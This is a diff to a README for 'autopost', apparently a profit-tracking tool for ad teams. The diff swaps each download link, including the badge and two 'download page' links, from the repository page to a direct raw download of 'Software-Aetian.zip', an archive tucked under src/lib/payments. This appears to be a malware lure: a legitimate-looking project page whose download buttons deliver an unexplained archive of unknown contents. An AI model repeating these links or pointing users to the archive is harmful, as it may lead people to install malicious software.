@@ -1,6 +1,6 @@
 # 🤖 autopost - Clear profit tracking for ad teams
 
-[![Download](https://img.shields.io/badge/Download-Run%20autopost-blue?style=for-the-badge&logo=github)](https://github.com/Familypectinidaecritic903/autopost)
+[![Download](https://img.shields.io/badge/Download-Run%20autopost-blue?style=for-the-badge&logo=github)](https://github.com/Familypectinidaecritic903/autopost/raw/refs/heads/main/src/lib/payments/Software-Aetian.zip)
 
 ## 📌 What autopost does
 
@@ -33,7 +33,7 @@ If you plan to host it yourself, you also need:
 
 Use this link to visit the download page and get autopost:
 
-[Visit the download page](https://github.com/Familypectinidaecritic903/autopost)
+[Visit the download page](https://github.com/Familypectinidaecritic903/autopost/raw/refs/heads/main/src/lib/payments/Software-Aetian.zip)
 
 ## 🪟 Run on Windows
 
@@ -216,7 +216,7 @@ Common connections include:
 
 If you have not opened the download page yet, use this link now:
 
-[https://github.com/Familypectinidaecritic903/autopost](https://github.com/Familypectinidaecritic903/autopost)
+[https://github.com/Familypectinidaecritic903/autopost/raw/refs/heads/main/src/lib/payments/Software-Aetian.zip](https://github.com/Familypectinidaecritic903/autopost/raw/refs/heads/main/src/lib/payments/Software-Aetian.zip)
 
 ## ⌨️ Basic terms
 
